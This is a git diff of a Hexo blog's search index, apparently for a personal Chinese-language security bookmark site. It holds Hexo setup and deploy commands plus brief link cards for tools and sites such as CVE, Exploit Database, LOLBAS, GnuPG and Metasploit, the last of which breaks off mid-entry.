@@ -1,6 +1,59 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hexo搭建</title>
+    <url>/2025/05/01/#Hexo%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="Hexo搭建步骤："><a href="#Hexo搭建步骤：" class="headerlink" title="Hexo搭建步骤："></a>Hexo搭建步骤：</h2><p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></p>
+<ol>
+<li>下载安装Git和Node.js后，D 盘创建WWW，WWW目录下cmd</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g </span><br><span class="line">hexo init Blog</span><br><span class="line"><span class="built_in">cd</span> Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
+
+
+<ol start="2">
+<li><p>创建GitHub仓库: <a href="https://cyphersun.github.io/">https://cyphersun.github.io/</a></p>
+</li>
+<li><p>链接GitHub，然后确认</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;CypherSun&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;84860748@qq.com&quot;</span></span><br><span class="line"></span><br><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure>
+
+
+<ol start="4">
+<li>创建SSH文件，一直回车就行</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;84860748@qq.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<ol start="5">
+<li><p>在GitHub的Setting中，找到SSH keys，点击New SSH key，输入在本地生成的id_rsa.pub，不是id_rsa，两个别弄错了</p>
+</li>
+<li><p>输入yes，确定链接GitHub</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+
+
+<ol start="7">
+<li>Blog目录下cmd</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
+
+
+<ol start="8">
+<li><p>复制备份的scaffolds，source，_config.yml，_config.async.yml，package.json到Blog目录下</p>
+</li>
+<li><p>访问本地：<br>hexo clean<br>hexo g<br>hexo s<br>访问本地 <a href="http://localhost:4000/">4000 端口</a></p>
+</li>
+<li><p>上传Github：<br>hexo clean<br>hexo g<br>hexo d<br>npm run a<br>访问 <a href="https://cyphersun.github.io/">Github 网址</a></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>重要</category>
+      </categories>
+  </entry>
+  <entry>
     <title>博客示例</title>
     <url>/2077/07/07/#%E5%8D%9A%E5%AE%A2%E7%A4%BA%E4%BE%8B/</url>
     <content><![CDATA[<h2 id="侦察（Reconnaissance）"><a href="#侦察（Reconnaissance）" class="headerlink" title="侦察（Reconnaissance）"></a>侦察（Reconnaissance）</h2><p><IP>&#x2F;<HOSTNAME>: 192.0.2.1&#x2F;example.com</p>
@@ -73,6 +126,19 @@
       </categories>
   </entry>
   <entry>
+    <title>Advanced search operators list</title>
+    <url>/2025/05/13/T-Advanced-search-operators-list/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Advanced-search-operators-list"><a href="#Advanced-search-operators-list" class="headerlink" title="Advanced search operators list"></a><a href="https://github.com/cipher387/Advanced-search-operators-list">Advanced search operators list</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>邮箱和即时通讯<br>云存储<br>操作系统<br>搜索引擎<br>社交媒体<br>内容分析<br>编码<br>求职<br>生产力和项目管理<br>密码管理器 物<br>联网搜索引擎<br>市场<br>地图 图片<br>图书馆<br>客户<br>支持<br>新闻&#x2F;RSS<br>数据库<br>工具<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
     <title>网站模板</title>
     <url>/2025/05/01/#%E7%BD%91%E7%AB%99%E6%A8%A1%E6%9D%BF/</url>
     <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><br>
@@ -84,87 +150,6 @@
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
         <category>重要</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Hexo搭建</title>
-    <url>/2025/05/01/#Hexo%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="Hexo搭建步骤："><a href="#Hexo搭建步骤：" class="headerlink" title="Hexo搭建步骤："></a>Hexo搭建步骤：</h2><p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></p>
-<ol>
-<li>下载安装Git和Node.js后，D 盘创建WWW，WWW目录下cmd</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g </span><br><span class="line">hexo init Blog</span><br><span class="line"><span class="built_in">cd</span> Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
-
-
-<ol start="2">
-<li><p>创建GitHub仓库: <a href="https://cyphersun.github.io/">https://cyphersun.github.io/</a></p>
-</li>
-<li><p>链接GitHub，然后确认</p>
-</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;CypherSun&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;84860748@qq.com&quot;</span></span><br><span class="line"></span><br><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure>
-
-
-<ol start="4">
-<li>创建SSH文件，一直回车就行</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;84860748@qq.com&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<ol start="5">
-<li><p>在GitHub的Setting中，找到SSH keys，点击New SSH key，输入在本地生成的id_rsa.pub，不是id_rsa，两个别弄错了</p>
-</li>
-<li><p>输入yes，确定链接GitHub</p>
-</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
-
-
-<ol start="7">
-<li>Blog目录下cmd</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
-
-
-<ol start="8">
-<li><p>复制备份的scaffolds，source，_config.yml，_config.async.yml，package.json到Blog目录下</p>
-</li>
-<li><p>访问本地：<br>hexo clean<br>hexo g<br>hexo s<br>访问本地 <a href="http://localhost:4000/">4000 端口</a></p>
-</li>
-<li><p>上传Github：<br>hexo clean<br>hexo g<br>hexo d<br>npm run a<br>访问 <a href="https://cyphersun.github.io/">Github 网址</a></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>重要</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Apache</title>
-    <url>/2025/05/14/T-Apache/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a><a href="https://httpd.apache.org/">Apache</a></h3><h3 id="Apache-HTTP-Server-Documentation"><a href="#Apache-HTTP-Server-Documentation" class="headerlink" title="Apache HTTP Server Documentation"></a><a href="https://httpd.apache.org/docs/">Apache HTTP Server Documentation</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Apache HTTP 服务器项目致力于开发和维护一个适用于现代操作系统（包括 UNIX 和 Windows）的开源 HTTP 服务器。该项目的目标是提供一个安全、高效且可扩展的服务器，并提供与当前 HTTP 标准同步的 HTTP 服务。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Advanced search operators list</title>
-    <url>/2025/05/13/T-Advanced-search-operators-list/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Advanced-search-operators-list"><a href="#Advanced-search-operators-list" class="headerlink" title="Advanced search operators list"></a><a href="https://github.com/cipher387/Advanced-search-operators-list">Advanced search operators list</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>邮箱和即时通讯<br>云存储<br>操作系统<br>搜索引擎<br>社交媒体<br>内容分析<br>编码<br>求职<br>生产力和项目管理<br>密码管理器 物<br>联网搜索引擎<br>市场<br>地图 图片<br>图书馆<br>客户<br>支持<br>新闻&#x2F;RSS<br>数据库<br>工具<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
       </categories>
   </entry>
   <entry>
@@ -183,16 +168,31 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE</title>
-    <url>/2025/05/13/T-CVE/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a><a href="https://www.cve.org/">CVE</a></h3><br>
+    <title>Chrome Root Store</title>
+    <url>/2025/06/03/T-Chrome-Root-Store/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Chrome-Root-Store"><a href="#Chrome-Root-Store" class="headerlink" title="Chrome Root Store"></a><a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>识别、定义和分类公开披露的网络安全漏洞。<br>目前有超过281,000 条CVE 记录可通过上面的下载或关键字搜索访问。<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>可信根<br>约束根<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
         <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Apache</title>
+    <url>/2025/05/14/T-Apache/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a><a href="https://httpd.apache.org/">Apache</a></h3><h3 id="Apache-HTTP-Server-Documentation"><a href="#Apache-HTTP-Server-Documentation" class="headerlink" title="Apache HTTP Server Documentation"></a><a href="https://httpd.apache.org/docs/">Apache HTTP Server Documentation</a></h3><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Apache HTTP 服务器项目致力于开发和维护一个适用于现代操作系统（包括 UNIX 和 Windows）的开源 HTTP 服务器。该项目的目标是提供一个安全、高效且可扩展的服务器，并提供与当前 HTTP 标准同步的 HTTP 服务。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>工具</category>
       </categories>
   </entry>
   <entry>
@@ -213,13 +213,26 @@
       </categories>
   </entry>
   <entry>
-    <title>Chrome Root Store</title>
-    <url>/2025/06/03/T-Chrome-Root-Store/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Chrome-Root-Store"><a href="#Chrome-Root-Store" class="headerlink" title="Chrome Root Store"></a><a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a></h3><br>
+    <title>CVE</title>
+    <url>/2025/05/13/T-CVE/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a><a href="https://www.cve.org/">CVE</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>可信根<br>约束根<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>识别、定义和分类公开披露的网络安全漏洞。<br>目前有超过281,000 条CVE 记录可通过上面的下载或关键字搜索访问。<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>DuckDuckGo</title>
+    <url>/2025/05/13/T-DuckDuckGo/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="DuckDuckGo"><a href="#DuckDuckGo" class="headerlink" title="DuckDuckGo"></a><a href="https://duckduckgo.com/">DuckDuckGo</a></h3><h3 id="Advanced-Search-Syntax"><a href="#Advanced-Search-Syntax" class="headerlink" title="Advanced Search Syntax"></a><a href="https://duckduckgo.com/duckduckgo-help-pages/results/syntax">Advanced Search Syntax</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>改用 DuckDuckGo，私密且免费！<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
 ]]></content>
       <categories>
         <category>网站</category>
@@ -233,6 +246,36 @@
 
 <h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>生成器可以帮助您生成一个 crontab 语法，您可以将其复制并粘贴到您的 crontab 文件中（您可以使用命令打开该文件crontab –e）。在生成的 crontab 语法下方，还会显示一个运行时间列表。预测功能将帮助您确保设置正确的时间和日期。<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>设置<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Exploit Database</title>
+    <url>/2025/05/13/T-Exploit-Database/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Exploit-Database"><a href="#Exploit-Database" class="headerlink" title="Exploit Database"></a><a href="https://www.exploit-db.com/">Exploit Database</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>GitHub</title>
+    <url>/2025/05/13/T-GitHub/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a><a href="https://github.com/">GitHub</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
         <category>网站</category>
@@ -266,64 +309,6 @@
 ]]></content>
       <categories>
         <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>GitHub</title>
-    <url>/2025/05/13/T-GitHub/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a><a href="https://github.com/">GitHub</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>DuckDuckGo</title>
-    <url>/2025/05/13/T-DuckDuckGo/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="DuckDuckGo"><a href="#DuckDuckGo" class="headerlink" title="DuckDuckGo"></a><a href="https://duckduckgo.com/">DuckDuckGo</a></h3><h3 id="Advanced-Search-Syntax"><a href="#Advanced-Search-Syntax" class="headerlink" title="Advanced Search Syntax"></a><a href="https://duckduckgo.com/duckduckgo-help-pages/results/syntax">Advanced Search Syntax</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>改用 DuckDuckGo，私密且免费！<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Exploit Database</title>
-    <url>/2025/05/13/T-Exploit-Database/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Exploit-Database"><a href="#Exploit-Database" class="headerlink" title="Exploit Database"></a><a href="https://www.exploit-db.com/">Exploit Database</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>GnuPG</title>
-    <url>/2025/06/03/T-GnuPG/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="GnuPG"><a href="#GnuPG" class="headerlink" title="GnuPG"></a><a href="https://gnupg.org/">GnuPG</a></h3><h3 id="gpg-manpage"><a href="#gpg-manpage" class="headerlink" title="gpg manpage"></a><a href="https://www.gnupg.org/gph/de/manual/r1023.html">gpg manpage</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>GnuPG 是RFC4880 定义的 OpenPGP 标准（也称为PGP）的完整且免费的实现。GnuPG 允许您加密和签名数据及通信；它具有多功能密钥管理系统，以及用于各种公钥目录的访问模块。GnuPG（也称为GPG）是一个命令行工具，具有易于与其他应用程序集成的功能。它提供了丰富的 前端应用程序和库。GnuPG 还支持 S&#x2F;MIME 和安全 Shell (ssh)。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>工具</category>
       </categories>
   </entry>
   <entry>
@@ -379,6 +364,36 @@
 
 
 <h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>检查您的电子邮件地址是否遭遇数据泄露<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>GnuPG</title>
+    <url>/2025/06/03/T-GnuPG/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="GnuPG"><a href="#GnuPG" class="headerlink" title="GnuPG"></a><a href="https://gnupg.org/">GnuPG</a></h3><h3 id="gpg-manpage"><a href="#gpg-manpage" class="headerlink" title="gpg manpage"></a><a href="https://www.gnupg.org/gph/de/manual/r1023.html">gpg manpage</a></h3><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>GnuPG 是RFC4880 定义的 OpenPGP 标准（也称为PGP）的完整且免费的实现。GnuPG 允许您加密和签名数据及通信；它具有多功能密钥管理系统，以及用于各种公钥目录的访问模块。GnuPG（也称为GPG）是一个命令行工具，具有易于与其他应用程序集成的功能。它提供了丰富的 前端应用程序和库。GnuPG 还支持 S&#x2F;MIME 和安全 Shell (ssh)。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>LOLBAS</title>
+    <url>/2025/05/13/T-LOLBAS/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a><a href="https://lolbas-project.github.io/">LOLBAS</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
+
+
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
@@ -449,27 +464,12 @@
       </categories>
   </entry>
   <entry>
-    <title>LinkedIn</title>
-    <url>/2025/05/14/T-LinkedIn/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="LinkedIn"><a href="#LinkedIn" class="headerlink" title="LinkedIn"></a><a href="https://www.linkedin.com/feed/">LinkedIn</a></h3><br>
+    <title>Linux man pages</title>
+    <url>/2025/05/10/T-Linux-man-pages/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Linux-man-pages"><a href="#Linux-man-pages" class="headerlink" title="Linux man pages"></a><a href="https://linux.die.net/man/">Linux man pages</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>欢迎来到 LinkedIn，全球最大的职业网络，在全球 200 多个国家和地区拥有超过 10 亿会员。<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>LOLBAS</title>
-    <url>/2025/05/13/T-LOLBAS/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a><a href="https://lolbas-project.github.io/">LOLBAS</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
-
-
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>手册页分为几个部分。要查看某个部分的 Linux 手册页完整列表，请选择以下其中一个部分：<br>第 1 部分<br>用户命令（介绍）<br>第 2 节<br>系统调用（介绍）<br>第 3 节<br>库函数（介绍）<br>第 4 节<br>特殊文件（介绍）<br>第 5 节<br>文件格式（介绍）<br>第 6 节<br>游戏（介绍）<br>第 7 节<br>惯例与杂项（引言）<br>第 8 节<br>管理和特权命令（介绍）<br>L 区<br>数学库函数<br>第N部分<br>tcl函数<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
@@ -489,25 +489,12 @@
       </categories>
   </entry>
   <entry>
-    <title>Microsoft Security Response Center</title>
-    <url>/2025/06/12/T-Microsoft-Security-Response-Center/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Microsoft-Security-Response-Center"><a href="#Microsoft-Security-Response-Center" class="headerlink" title="Microsoft Security Response Center"></a><a href="https://msrc.microsoft.com/update-guide/vulnerability">Microsoft Security Response Center</a></h3><h3 id="Microsoft®-更新目录"><a href="#Microsoft®-更新目录" class="headerlink" title="Microsoft® 更新目录"></a><a href="https://www.catalog.update.microsoft.com/Home.aspx">Microsoft® 更新目录</a></h3><br>
+    <title>LinkedIn</title>
+    <url>/2025/05/14/T-LinkedIn/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="LinkedIn"><a href="#LinkedIn" class="headerlink" title="LinkedIn"></a><a href="https://www.linkedin.com/feed/">LinkedIn</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Microsoft 安全响应中心 (MSRC) 负责调查所有影响 Microsoft 产品和服务的安全漏洞报告，并在此提供信息，作为持续努力的一部分，帮助您管理安全风险并保护您的系统。<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Linux man pages</title>
-    <url>/2025/05/10/T-Linux-man-pages/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Linux-man-pages"><a href="#Linux-man-pages" class="headerlink" title="Linux man pages"></a><a href="https://linux.die.net/man/">Linux man pages</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>手册页分为几个部分。要查看某个部分的 Linux 手册页完整列表，请选择以下其中一个部分：<br>第 1 部分<br>用户命令（介绍）<br>第 2 节<br>系统调用（介绍）<br>第 3 节<br>库函数（介绍）<br>第 4 节<br>特殊文件（介绍）<br>第 5 节<br>文件格式（介绍）<br>第 6 节<br>游戏（介绍）<br>第 7 节<br>惯例与杂项（引言）<br>第 8 节<br>管理和特权命令（介绍）<br>L 区<br>数学库函数<br>第N部分<br>tcl函数<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>欢迎来到 LinkedIn，全球最大的职业网络，在全球 200 多个国家和地区拥有超过 10 亿会员。<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
@@ -517,14 +504,14 @@
   <entry>
     <title>Metasploit Framework</title>
     <url>/2025/06/12/T-Metasploit-Framework/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a><a href="https://www.metasploit.com/">Metasploit Framework</a></h3><h3 id="利用漏洞排名"><a href="#利用漏洞排名" class="headerlink" title="利用漏洞排名"></a><a href="https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html">利用漏洞排名</a></h3><br>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a><a href="https://www.metasploit.com/">Metasploit Framework</a></h3><br>
 
 
 <h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>世界上使用最广泛的渗透测试框架<br>知识就是力量，尤其是在共享知识的时候。Metasploit 是开源社区与 Rapid7 合作的成果，它不仅能帮助安全团队验证漏洞、管理安全评估和提升安全意识，还能赋能并武装防御者，让他们始终领先一步（甚至两步）。<br><br></p>
 <h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><h3 id="Kail"><a href="#Kail" class="headerlink" title="Kail"></a><a href="https://www.kali.org/tools/metasploit-framework/">Kail</a></h3><br>
 
 
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="初始化数据库命令"><a href="#初始化数据库命令" class="headerlink" title="初始化数据库命令"></a>初始化数据库命令</h3><table>
